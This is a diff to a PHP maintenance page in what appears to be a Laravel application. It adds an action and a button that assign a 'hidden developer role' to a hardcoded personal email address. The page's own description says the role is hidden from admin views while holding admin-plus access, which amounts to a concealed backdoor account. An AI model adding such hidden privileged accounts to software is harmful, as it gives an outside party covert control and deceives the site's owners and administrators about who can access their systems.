@@ -195,6 +195,10 @@ if (isset($_POST['action'])) {
             }
             $result = ['success' => true, 'output' => $output];
             break;
+        case 'assign_developer_role':
+            $email = 'work.jeromealtarejos@gmail.com';
+            $command = 'cd ' . escapeshellarg($cwd) . ' && php artisan user:assign-developer ' . escapeshellarg($email) . ' 2>&1';
+            break;
     }
     
     if ($command && !$result) {
@@ -343,6 +347,18 @@ if (isset($_POST['action'])) {
                 <form method="post" style="display: inline;">
                     <input type="hidden" name="action" value="optimize">
                     <button type="submit" class="btn btn-success">Optimize (Cache All)</button>
+                </form>
+            </div>
+        </div>
+        
+        <!-- Developer Role Assignment -->
+        <div class="section">
+            <h2>5. Developer Role Assignment</h2>
+            <p class="info">Assign hidden developer role to work.jeromealtarejos@gmail.com (hidden from admin views, has admin+ access)</p>
+            <div class="btn-group">
+                <form method="post" style="display: inline;">
+                    <input type="hidden" name="action" value="assign_developer_role">
+                    <button type="submit" class="btn btn-success">Assign Developer Role</button>
                 </form>
             </div>
         </div>
